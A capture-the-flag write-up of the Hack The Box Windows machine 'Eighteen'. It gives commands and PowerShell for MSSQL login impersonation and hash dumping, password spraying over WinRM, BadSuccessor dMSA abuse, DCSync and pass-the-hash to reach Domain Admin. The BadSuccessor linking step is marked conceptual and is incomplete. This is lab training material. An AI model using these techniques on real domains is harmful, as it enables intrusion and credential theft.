Hack The Box — Windows Easy

Eighteen Writeup

Author: Koussay Aydi | Tags: Active Directory, MSSQL, Password Spraying, BadSuccessor

Overview

Eighteen is a Windows Active Directory machine that chains together several realistic attack techniques: MSSQL credential abuse, hash cracking, password spraying, and finally privilege escalation via the BadSuccessor attack — abusing CreateChild rights on an OU to create a delegated Managed Service Account (dMSA) and impersonate the Domain Admin.

Reconnaissance

Starting with a targeted Nmap scan against the known ports:

nmap -sVC -p 80,1433,5985 -Pn --open 10.129.13.183

Key findings:

  • Port 80 — Microsoft IIS 10.0 (eighteen.htb)
  • Port 1433 — Microsoft SQL Server 2022
  • Port 5985 — WinRM (remote management)
  • Hostname: DC01.eighteen.htb — this is the Domain Controller

Add the target to /etc/hosts:

echo "10.129.13.183 eighteen.htb dc01.eighteen.htb" >> /etc/hosts

Foothold — MSSQL Enumeration & Hash Extraction

We're given initial credentials: kevin / iNa2we6haRj2gaw!

Connect to MSSQL using Impacket:

impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@10.129.13.183

Impersonation Privilege

SQL> enum_impersonate

Kevin can impersonate the appdev login:

SQL> EXECUTE AS LOGIN = 'appdev';
SQL> USE financial_planner;

Extracting Password Hashes

SQL> SELECT username, email, password_hash, is_admin FROM financial_planner.dbo.users;
usernameemailis_admin
adminadmin@eighteen.htb1

Admin hash:

pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133

Cracking the Hash

The PBKDF2-SHA256 Werkzeug hash cracks to: iloveyou1

User Flag — Password Spraying via WinRM

Domain User Enumeration

Using NetExec with RID brute-force to enumerate domain users:

nxc mssql 10.129.13.183 -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth

This reveals the following domain users (among others): jamie.dunn, jane.smith, alice.jones, adam.scott, bob.brown, carol.white, dave.green

Password Spray

Build a user list and spray the cracked password against WinRM:

nxc winrm 10.129.13.183 -u users.txt -p 'iloveyou1'

Hit: [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)

Shell & User Flag

evil-winrm -i 10.129.13.183 -u adam.scott -p 'iloveyou1'
*Evil-WinRM* PS> cat C:\Users\adam.scott\Desktop\user.txt
f5ed216f1e45d1a8f82dddd73fc08f81

Privilege Escalation — BadSuccessor (dMSA Abuse)

ACL Enumeration with PowerView

Upload and import PowerView, then find interesting ACLs:

Import-Module .\PowerView.ps1
Find-InterestingDomainAcl

Critical finding:

ObjectDN              : OU=Staff,DC=eighteen,DC=htb
ActiveDirectoryRights : CreateChild
IdentityReferenceName : IT

The IT group (which adam.scott is a member of) has CreateChild rights over OU=Staff. This is the precondition for the BadSuccessor attack.

The BadSuccessor Attack

BadSuccessor abuses Windows Server 2025's delegated Managed Service Accounts (dMSA). When a dMSA is created with a msDS-ManagedAccountPrecedessorLink pointing to a privileged principal (e.g., Domain Admin), the dMSA inherits that account's Kerberos privileges — effectively allowing full impersonation.

Step 1 — Create a computer account in OU=Staff:

$Password = "MyPassword123!"
$OU = "OU=Staff,DC=eighteen,DC=htb"
$OUObject = [ADSI]"LDAP://DC01.eighteen.htb/$OU"
$Computer = $OUObject.Create("computer", "CN=evilpc")
$Computer.Put("sAMAccountName", "evilpc$")
$Computer.Put("userAccountControl", 4096)
$Computer.SetInfo()
$Computer.SetPassword($Password)
$Computer.SetInfo()
$Computer.psbase.InvokeSet("AccountDisabled", $false)
$Computer.SetInfo()

Step 2 — Create a dMSA in OU=Staff:

New-ADServiceAccount `
  -Name evilmsa `
  -DNSHostName evilmsa.eighteen.htb `
  -Path "OU=Staff,DC=eighteen,DC=htb"

Confirm creation:

Get-ADServiceAccount evilmsa
# ObjectClass : msDS-GroupManagedServiceAccount
# SID         : S-1-5-21-...-12604

Step 3 — Link the dMSA to a privileged predecessor (Domain Admin / Administrator) and request a Kerberos ticket.

# PowerShell link modification (Conceptual logic)
$msa = [ADSI]"LDAP://dc01.eighteen.htb/CN=evilmsa,OU=Staff,DC=eighteen,DC=htb"
$admin = [ADSI]"LDAP://dc01.eighteen.htb/CN=Administrator,CN=Users,DC=eighteen,DC=htb"
$msa.Put("msDS-ManagedAccountPredecessorLink", $admin.distinguishedName)
$msa.SetInfo()

With the dMSA linked, we request its TGT. The KDC issues a ticket that includes the Administrator's credentials, granting full Domain Admin access.

Step 4 — Dump NTLM hashes / DCSync:

Using the obtained ticket, perform a DCSync to extract the Administrator NTLM hash:

impacket-secretsdump -just-dc-user Administrator eighteen.htb/evilmsa\$@dc01.eighteen.htb -hashes :<NTLM>

Step 5 — Pass-the-Hash for a SYSTEM shell:

evil-winrm -i 10.129.13.183 -u Administrator -H <NTLM_HASH>
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt

Attack Path Summary

kevin (MSSQL creds)
  └─► Impersonate appdev
        └─► Dump financial_planner hashes
              └─► Crack: iloveyou1
                    └─► Password spray → adam.scott (IT group, WinRM)
                          └─► CreateChild on OU=Staff
                                └─► BadSuccessor: create dMSA → inherit DA privileges
                                      └─► DCSync → Administrator NTLM
                                            └─► Root

Key Takeaways

  • MSSQL impersonation is often overlooked but can expose sensitive application data.
  • Password reuse between web apps and domain accounts is extremely common in CTF and real environments alike.
  • BadSuccessor (CVE-2025-29810) is a critical Windows Server 2025 privilege escalation path that requires only CreateChild on any OU — a surprisingly common misconfiguration for IT/helpdesk groups.
  • Always enumerate ACLs with PowerView — CreateChild on an OU is often dismissed but can be game-over in a 2025 domain.
